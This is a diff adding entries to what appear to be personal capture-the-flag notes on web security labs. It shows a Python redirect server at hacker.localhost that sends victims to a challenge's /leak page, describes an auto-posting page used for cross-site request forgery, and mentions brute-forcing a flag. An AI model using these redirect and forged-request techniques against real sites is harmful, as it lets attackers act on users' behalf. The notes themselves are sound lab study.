@@ -431,3 +431,29 @@ One application of web security is the prevention of random people from robbing 
 
 ### Level 7
 Very interesting problem. My only trouble was not knowing how to write the script. Turns out I had to use the `requests` module, mainly `requests.Session()`. Next is just trying out all possible characteres with the `post` function and adding the correct characters to the flag.
+
+### Level 11
+Very cool problem! To solve this problem, you have to host your own server at `hacker.localhost`. Luckily the `/etc/hosts` file already has `hacker.localhost` listed at `127.0.0.1`. Then you have to configure the server so that it redirects any connection to the `challenge.localhost/leak` page.
+
+```python
+class RedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'http://challenge.localhost/leak')
+        self.end_headers()
+```
+
+### Level 12
+The solution here is to host a web page which actually posts on load with the python server.
+
+```python
+class RedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+     
+        with open("index.html", "r") as f:
+            self.wfile.write(f.read().encode())
+```
+
